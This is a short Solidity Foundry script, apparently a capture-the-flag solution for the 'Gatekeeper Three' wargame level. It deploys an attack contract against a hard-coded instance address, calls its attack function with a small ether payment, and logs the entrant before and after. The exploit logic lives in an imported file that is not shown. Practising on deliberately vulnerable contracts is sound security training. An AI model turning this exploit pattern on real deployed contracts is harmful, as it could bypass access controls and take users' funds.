// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {GatekeeperThree, SimpleTrick} from "../src/level28/GatekeeperThree.sol";
import {AttackGatekeeperThree} from "../src/level28/AttackGatekeeperThree.sol";

import "forge-std/console.sol";

contract level28Exploit is Script {
    GatekeeperThree gatekeeperThree =
        GatekeeperThree(payable(0x6B447F38680463C4F0DFA2851B0afA3CA0c53ff2));
    AttackGatekeeperThree attackGatekeeperThree;

    function run() external {
        vm.startBroadcast();
        console.log("Entrant: ", gatekeeperThree.entrant());
        attackGatekeeperThree = new AttackGatekeeperThree(
            address(gatekeeperThree)
        );
        attackGatekeeperThree.attack{value: 0.0011 ether}();
        console.log("Entrant: ", gatekeeperThree.entrant());
        vm.stopBroadcast();
    }
}
